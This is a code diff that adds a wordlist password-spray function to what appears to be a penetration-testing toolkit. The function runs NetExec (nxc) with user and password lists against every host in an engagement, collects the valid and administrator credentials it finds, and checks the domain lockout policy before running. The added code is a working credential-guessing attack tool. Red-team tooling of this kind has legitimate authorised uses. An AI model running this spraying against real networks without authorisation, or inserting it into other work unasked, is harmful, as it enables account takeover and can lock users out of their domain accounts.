@@ -192,3 +192,130 @@ def spray_loop(store, config, *, proto="smb", subnet=None, run=None, loot=True,
                 report.creds_recovered += _loot_host(store, host, run, report, on_event)
 
     return report
+
+
+# --------------------------------------------------------------- wordlist spray
+# Different threat model from stored-cred spray:
+#
+#   * stored-cred spray reuses each account's own *proven* secret -> impossible
+#     to lock an account by construction;
+#   * wordlist spray tries user × password combinations -> WILL lock accounts if
+#     the domain has a lockout policy and the operator does not respect it.
+#
+# fieldkit reads the lockout policy first (same read_policy() as stored spray)
+# and refuses to run beyond `safe_attempts` combinations per window unless the
+# operator explicitly acknowledges the risk (`allow_lockout_risk=True`).
+
+import os
+
+
+@dataclass
+class WordlistReport:
+    """One wordlist-spray invocation."""
+
+    proto: str = "smb"
+    userlist: str = None
+    passlist: str = None
+    combinations: int = 0
+    valid: int = 0
+    admin: int = 0
+    creds_added: int = 0
+    hosts_added: int = 0
+    access_added: int = 0
+    aborted: str = None
+    policy: object = None
+    policy_note: str = None
+
+
+def _count_lines(path):
+    n = 0
+    with open(path, "r", errors="replace") as fh:
+        for line in fh:
+            if line.strip() and not line.startswith("#"):
+                n += 1
+    return n
+
+
+def wordlist_spray(store, config, *, proto="smb", subnet=None, userlist=None,
+                   passlist=None, run=None, timeout=1800, source="wordlist-spray",
+                   dc_ip=None, allow_lockout_risk=False, continue_on_success=True,
+                   on_event=None):
+    """Wordlist × password spray via nxc: ``-u <userlist> -p <passlist>``.
+
+    Only recovered credentials land in the store — a raw wordlist does not
+    pollute state. Refuses to run when the lockout policy would trip unless
+    ``allow_lockout_risk=True`` (deliberate operator opt-in — the risk is a
+    locked domain account).
+    """
+    run = run or (lambda argv, env=None: runner_mod.run(argv, env_add=env,
+                                                       timeout=timeout))
+    rep = WordlistReport(proto=proto, userlist=userlist, passlist=passlist)
+
+    userlist = userlist or config.get("userlist")
+    passlist = passlist or config.get("passlist")
+    if not userlist or not passlist:
+        rep.aborted = ("wordlist spray needs both a userlist and a passlist "
+                       "— pass --userlist/--passlist or `config set userlist=… "
+                       "passlist=…`")
+        return rep
+    if not os.path.exists(userlist):
+        rep.aborted = f"userlist not found: {userlist}"
+        return rep
+    if not os.path.exists(passlist):
+        rep.aborted = f"passlist not found: {passlist}"
+        return rep
+    rep.userlist, rep.passlist = userlist, passlist
+    rep.combinations = _count_lines(userlist) * _count_lines(passlist)
+
+    hosts = store.hosts(subnet=subnet)
+    ips = [h["ip"] for h in hosts]
+    if not ips:
+        rep.aborted = ("no hosts in the engagement"
+                       + (f" for {subnet}" if subnet else ""))
+        return rep
+
+    # Read policy up front. If we know the policy and the run would exceed
+    # safe_attempts per user, refuse unless the operator opted in.
+    if store.credentials():
+        first = store.credentials()[0]
+        policy, note = read_policy(store, Credential.from_row(first), run, dc_ip=dc_ip)
+        rep.policy, rep.policy_note = policy, note
+        if policy is not None and policy.has_lockout:
+            per_user_attempts = _count_lines(passlist)
+            if per_user_attempts > policy.safe_attempts and not allow_lockout_risk:
+                rep.aborted = (
+                    f"lockout policy: {policy.threshold}/{policy.reset_minutes}min "
+                    f"— {per_user_attempts} passwords per user exceeds "
+                    f"{policy.safe_attempts} safe attempts/window. Pass "
+                    "`--allow-lockout-risk` to run anyway (you accept the risk "
+                    "of locking accounts), or trim the passlist.")
+                return rep
+    else:
+        rep.policy_note = "no stored credentials — cannot read lockout policy first"
+
+    if on_event:
+        on_event(f"wordlist spray {proto}: {rep.combinations} combos across "
+                 f"{len(ips)} host(s)  users={userlist}  passwords={passlist}")
+
+    argv = ["nxc", proto] + ips + ["-u", userlist, "-p", passlist]
+    if continue_on_success:
+        argv += ["--continue-on-success"]
+    if config.get("domain"):
+        argv += ["-d", config["domain"]]
+
+    result = run(argv, None)
+    if result.error:
+        rep.aborted = result.error
+        return rep
+
+    intent = classify_nxc(result.output or "")
+    ingest_rep = apply_nxc(store, intent, source=source)
+    rep.valid = len(intent.creds)
+    rep.admin = sum(1 for _c, r in intent.creds if r.admin)
+    rep.creds_added = ingest_rep.creds_added
+    rep.hosts_added = ingest_rep.hosts_added
+    rep.access_added = ingest_rep.access_added
+    if on_event:
+        on_event(f"wordlist spray: {rep.valid} valid, {rep.admin} admin, "
+                 f"{rep.creds_added} new credentials")
+    return rep
